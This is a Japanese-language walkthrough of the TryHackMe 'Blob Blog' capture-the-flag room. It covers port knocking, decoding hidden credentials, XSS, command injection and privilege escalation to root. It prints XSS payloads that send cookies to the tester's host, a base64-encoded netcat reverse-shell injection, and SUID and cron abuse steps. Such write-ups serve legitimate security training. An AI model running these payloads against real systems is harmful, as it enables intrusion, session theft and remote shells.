# The Blob Blog CTF

https://tryhackme.com/room/theblobblog

## Enumeration

```shell
TARGET=10.10.146.232
sudo bash -c "echo $TARGET   blob.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

Open 10.10.146.232:22
Open 10.10.146.232:80
```

SSH, HTTP のみ。

トップページのコメントを Base64デコードしたら [brainfuck](https://copy.sh/brainfuck/) のコードになった。  
実行結果。

```
When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!
```

ポートノッキング 1,3,5 の順。

一番下にあったもう１つのコメント。

```
<!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
-->
```

Base58デコードしたらパスワードらしき文字列になった。

## ポートノッキング

ポートノッキング実行。

```sh
knock -d 100 $TARGET 1 3 5
```

再度、rustscanしたら 22、445、8080 が開いた。

```sh
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 61
22/tcp   open  ssh          syn-ack ttl 61
80/tcp   open  http         syn-ack ttl 61
445/tcp  open  microsoft-ds syn-ack ttl 61
8080/tcp open  http-proxy   syn-ack ttl 61
```

8080ポートもApacheインストールページだが、コメントから違うページとわかる。

### FTP

コメントから入手したパスワードを使って、bob としてログイン成功。

```sh
$ ftp $TARGET
Connected to 10.10.146.232.
220 (vsFTPd 3.0.2)
Name (10.10.146.232:kali): bob
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||29519|).
150 Here comes the directory listing.
dr-xr-xr-x    3 1001     1001         4096 Jul 25  2020 .
dr-xr-xr-x    3 1001     1001         4096 Jul 25  2020 ..
-rw-r--r--    1 1001     1001          220 Jul 25  2020 .bash_logout
-rw-r--r--    1 1001     1001         3771 Jul 25  2020 .bashrc
-rw-r--r--    1 1001     1001          675 Jul 25  2020 .profile
-rw-r--r--    1 1001     1001         8980 Jul 25  2020 examples.desktop
dr-xr-xr-x    3 65534    65534        4096 Jul 25  2020 ftp
226 Directory send OK.
```

全ファイルダウンロードした。

```sh
$ ls -al
total 44
drwxrwxr-x 3 kali kali 4096 Jul 10 16:48 .
drwxrwxr-x 8 kali kali 4096 Jul 10 16:11 ..
-rw-rw-r-- 1 kali kali  220 Jul 25  2020 .bash_logout
-rw-rw-r-- 1 kali kali 3771 Jul 25  2020 .bashrc
-rw-rw-r-- 1 kali kali 8183 Jul 29  2020 cool.jpeg
-rw-rw-r-- 1 kali kali 8980 Jul 25  2020 examples.desktop
-rw-rw-r-- 1 kali kali  675 Jul 25  2020 .profile
```

jpeg から stegseek でファイル抽出

```sh
$ stegseek ./cool.jpeg                
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "p@55w0rd"       
[i] Original filename: "out.txt".
[i] Extracting to "cool.jpeg.out".
```

認証情報らしきものと、URLのパスらしき文字列。

```sh
$ cat ./cool.jpeg.out 
zcv:[REDACTED]
/bobs_safe_for_stuff
```

dirsearchをかけたが、何も出ない。80ポートも同じ。

```sh
$ dirsearch --url http://blob.thm:8080/bobs_safe_for_stuff
```

445ポートもHTTPだった。

```sh
$ sudo nmap -sV -p445 $TARGET         
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-10 17:04 JST
Nmap scan report for blob.thm (10.10.146.232)
Host is up (0.27s latency).

PORT    STATE SERVICE VERSION
445/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

コメント

```
<!--
Bob, I swear to goodness, if you can't remember p@55w0rd 
It's not that hard
-->
```

http://blob.thm:445/bobs_safe_for_stuff

```
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter
```

youmayenter。使いどころが分からない。

445ポートに /user を発見。

```sh
$ dirsearch --url http://blob.thm:445/                   

[17:16:53] 200 -    3KB - /user
```

http://blob.thm:445/user

SSH秘密鍵が出てきた。

```
-----BEGIN OPENSSH PRIVATE KEY-----
KSHyMzjjE7pZPFLIWrUdNridNrips0Gtj2Yxm2RhDIkiAxtniSDwgPRkjLMRFhY=
...
q3GwjcSkiR1wKFzyorTFLIPFMO5kgxCPFLITgx9cOVLIPFLIPFLJPFLKUbLIPFohr2lekc
-----END OPENSSH PRIVATE KEY-----
```

SSH接続で使おうとしたがエラーが発生する。tacで逆順にしても同じ。

```sh
$ ssh bob@$TARGET -i ./id_rsa
Load key "./id_rsa": error in libcrypto
bob@10.10.146.232's password: 
```

8080ポートで /login 発見。

```sh
$ dirsearch --url http://blob.thm:8080/                   
                            
[17:33:32] 302 -  219B  - /blog  ->  http://blob.thm:8080/login             
[17:34:33] 200 -  546B  - /login                                            
[17:35:14] 302 -  219B  - /review  ->  http://blob.thm:8080/login 
```

序盤で入手した「認証情報らしき文字列」を、youmayenter をキーとして、vigenere-cipher 復号するとbobの認証情報になり、ログインできた。

## blog

ブログのレビュー履歴のようなリンク先を見ると、下記のメッセージが表示された。`<` がエンコードされていないことがわかる。

```
This is the best blog I've ever read! I wanna be you <3 
```

### XSS

```js
Very Nice!<script>document.write('<img src="http://10.13.85.243:8000/' + document.cookie + '">')</script>
```

```js
Nice!<script>fetch('http://10.13.85.243:8000?cookie=' + btoa(document.cookie) );</script>
```

自分でメッセージを表示したらリクエストが来ているのでスクリプト自体は有効だが、他の誰かがリクエストしに来る気配はない。別の道を探す。

### sqlmap

sqlmap を実行したが、脆弱性発見できず。

```sh
sqlmap -r ./post.txt -p review --dbs --batch
```

### コマンドインジェクション

`hello; id` を入力したらコマンドが実行された。

```
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

Base64エンコードを使ってリバースシェルを実行。

```
hello; echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEzLjg1LjI0MyA4ODg4ID4vdG1wL2YK' | base64 -d  | sh
```

成功

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.146.232] 51320
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格１

SUID

```sh
www-data@bobloblaw-VirtualBox:/home/bob$ find / -perm -u=s -type f -ls 2>/dev/nul
     5139     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   151744    432 -rwsr-xr-x   1 root     root       440416 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   402119     12 -rwsr-xr-x   1 root     root        10232 Apr 11  2017 /usr/lib/x86_64-linux-gnu/ubuntu-app-launch/oom-adjust-setuid-helper
   398962     20 -rwsr-xr-x   1 root     root        18736 Mar 17  2017 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
     4843     44 -rwsr-xr--   1 root     messagebus    42992 Oct 11  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    20097     92 -rwsr-sr-x   1 root     root          93944 Mar 25  2019 /usr/lib/snapd/snap-confine
     5530     16 -rwsr-xr-x   1 root     root          14328 Oct 21  2016 /usr/lib/policykit-1/polkit-agent-helper-1
     8255    384 -rwsr-xr--   1 root     dip          390888 Jan 29  2016 /usr/sbin/pppd
     1193     40 -rwsr-xr-x   1 root     root          39904 Sep 20  2016 /usr/bin/newgrp
      779     76 -rwsr-xr-x   1 root     root          75304 Sep 20  2016 /usr/bin/gpasswd
     1828     20 -rwsr-xr-x   1 root     root          18448 Mar  9  2017 /usr/bin/traceroute6.iputils
      438     40 -rwsr-xr-x   1 root     root          40432 Sep 20  2016 /usr/bin/chsh
     1375     24 -rwsr-xr-x   1 root     root          22520 Oct 21  2016 /usr/bin/pkexec
      436     72 -rwsr-xr-x   1 root     root          71824 Sep 20  2016 /usr/bin/chfn
     1758    140 -rwsr-xr-x   1 root     root         140944 Jan 13  2017 /usr/bin/sudo
      351     24 -rwsr-xr-x   1 root     root          22528 Mar  9  2017 /usr/bin/arping
      207     20 -rwsrwxr-x   1 bobloblaw bobloblaw     16768 Jul 25  2020 /usr/bin/blogFeedback
     1261     56 -rwsr-xr-x   1 root      root          54256 Sep 20  2016 /usr/bin/passwd
   524394    144 -rwsr-xr-x   1 root      root         146128 Feb  1  2017 /bin/ntfs-3g
   524448     40 -rwsr-xr-x   1 root      root          40128 Sep 20  2016 /bin/su
   524346     32 -rwsr-xr-x   1 root      root          30800 Aug 11  2016 /bin/fusermount
   524383     40 -rwsr-xr-x   1 root      root          38984 Nov 16  2016 /bin/mount
   524420     64 -rwsr-xr-x   1 root      root          64424 Mar  9  2017 /bin/ping
   524469     32 -rwsr-xr-x   1 root      root          30792 Nov 16  2016 /bin/umount
   139449   1408 -rwsr-xr-x   1 root      root        1440808 Jul 10  2020 /opt/VBoxGuestAdditions-6.1.12/bin/VBoxDRMClient
```

`/usr/bin/blogFeedback` に bobloblaw のSUIDがついている。

```sh
-rwsrwxr-x 1 bobloblaw bobloblaw 16768 Jul 25  2020 /usr/bin/blogFeedback
```

ghidraで解析

```c
undefined8 main(int param_1,long param_2)
{
  int iVar1;
  int local_c;
  
  if ((param_1 < 7) || (7 < param_1)) {
    puts("Order my blogs!");
  }
  else {
    for (local_c = 1; local_c < 7; local_c = local_c + 1) {
      iVar1 = atoi(*(char **)(param_2 + (long)local_c * 8));
      if (iVar1 != 7 - local_c) {
        puts("Hmm... I disagree!");
        return 0;
      }
    }
    puts("Now that, I can get behind!");
    setreuid(1000,1000);
    system("/bin/sh");
  }
  return 0;
}
```

1. 引数は6個必要
2. 順番に、6,5,4,3,2,1

を渡せば、bobloblawのシェルを取れるはず。

```sh
/usr/bin/blogFeedback 6 5 4 3 2 1
Now that, I can get behind!
$ id
uid=1000(bobloblaw) gid=33(www-data) groups=33(www-data)
```
成功。

## 権限昇格２

```sh
sudo -l
Matching Defaults entries for bobloblaw on bobloblaw-VirtualBox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bobloblaw may run the following commands on bobloblaw-VirtualBox:
    (root) NOPASSWD: /bin/echo, /usr/bin/yes
```

echo, yes は悪用できるアイデアがない。

cron

```sh
cat /etc/crontab

*  *    * * *   root    cd /home/bobloblaw/Desktop/.uh_oh && tar -zcf /tmp/backup.tar.gz *
```

/home/bobloblaw/Desktop/.uh_oh にファイルを作れるのであれば、ワイルドカードを利用してシェルを実行させることができるが、今は不可能。

定期的に煽りメッセージが表示されるので、pspyをコピーして実行したところ、次のcソースがビルドされて実行されていることが分かった。

```c
$ cat .boring_file.c
#include <stdio.h>
int main() {
        printf("You haven't rooted me yet? Jeez\n");
        return 0;
}
```

上書きできる。

```sh
$ ls -al
total 16
drwxr-xr-x  3 bobloblaw bobloblaw 4096 Jul 30  2020 .
drwxrwx--- 16 bobloblaw bobloblaw 4096 Aug  6  2020 ..
drwxrwx---  2 bobloblaw bobloblaw 4096 Jul 10 06:33 .also_boring
-rw-rw----  1 bobloblaw bobloblaw   92 Jul 30  2020 .boring_file.c
```

https://www.revshells.com/ でC言語のリバースシェルコードを作成し、上書き。

rootシェル取得成功！

```sh
$ nc -lnvp 8889
listening on [any] 8889 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.146.232] 59714
id
uid=0(root) gid=0(root) groups=0(root)
```

```sh
ls -al /root
total 44
drwx------  7 root root 4096 Jul 29  2020 .
drwxr-xr-x 25 root root 4096 Jul 28  2020 ..
lrwxrwxrwx  1 root root    9 Jul 29  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Jul 27  2020 .cache
drwxr-xr-x  6 root root 4096 Jul 27  2020 .config
drwxr-xr-x  3 root root 4096 Jul 24  2020 .local
drwxr-xr-x  2 root root 4096 Jul 24  2020 .nano
drwxr-xr-x  2 root root 4096 Jul 28  2020 .patch
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--r-----  1 root root   28 Jul 26  2020 root.txt
-rw-r--r--  1 root root   66 Jul 24  2020 .selected_editor
```

## 振り返り

- brainfuckを日本語のページで実行したら無限ループになったが、英語のページで実行したらメッセージになった。信頼性はまちまちであることを覚えておく。
- 煽りメッセージがムカつくからといって、無意識的に見ないようにするのは良くないと反省。
- C言語のリバースシェルは初めてだったと思う。
